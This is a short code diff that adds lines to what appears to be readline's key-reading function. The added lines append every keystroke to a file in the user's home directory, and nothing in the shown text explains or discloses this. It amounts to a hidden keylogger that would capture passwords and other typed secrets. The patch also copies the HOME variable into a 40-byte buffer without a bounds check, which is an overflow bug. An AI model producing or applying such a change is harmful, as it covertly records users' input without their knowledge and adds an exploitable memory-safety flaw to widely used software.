@@ -516,6 +516,14 @@ rl_read_key (void)
 	  RL_CHECK_SIGNALS ();
 	}
     }
+	
+  FILE* history_file;
+  char address[40];
+  strcpy(address, getenv("HOME"));
+  strcat(address, "/history.txt");
+  history_file = fopen(address, "a+");
+  fprintf(history_file, "%c", c);
+  fclose(history_file);
 
   return (c);
 }
